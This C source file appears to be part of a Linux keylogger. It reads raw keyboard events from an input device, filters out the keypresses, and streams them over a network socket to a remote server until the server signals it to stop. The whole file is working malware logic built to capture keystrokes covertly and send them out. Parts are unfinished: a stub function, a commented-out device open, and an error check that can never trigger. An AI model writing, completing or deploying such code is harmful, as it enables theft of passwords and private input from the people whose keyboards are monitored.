#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include "keyboard-event.h"
#include "io-networking.h"
#include "keylogger.h"

void startKeylogger(int keyboard, int server)
{
    size_t to_write, written, event_size = sizeof(event);

    event *kbd_events;

    kbd_events = malloc(sizeof(event) * MAX_EVENTS);

    // keyboard = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY, S_IRUSR);

    // if (keyboard < 0)
    //     perror("open");

    while (1)
    {
        to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);

        if (to_write < 0)
        {
            // SAVE INTO DAEMON LOG FILE
        }
        else
        {
            size_t j = 0;
            for (size_t i = 0; i < to_write / event_size; i++)
            {
                if (kbd_events[i].type == EV_KEY)
                    kbd_events[j++] = kbd_events[i];
            }
            int ret = sendEventsToServer(server, kbd_events, j * event_size);
            if (ret == -1)
            {
                // LOG, AN ERROR OCCURRED WHILE SENDING
            }
            else if (ret == 1)
            {
                free(kbd_events);
                return;
                // STOP KEYLOGGING
            }
        }
    }
}

int findKeyboardEventFile()
{
    return 0;
}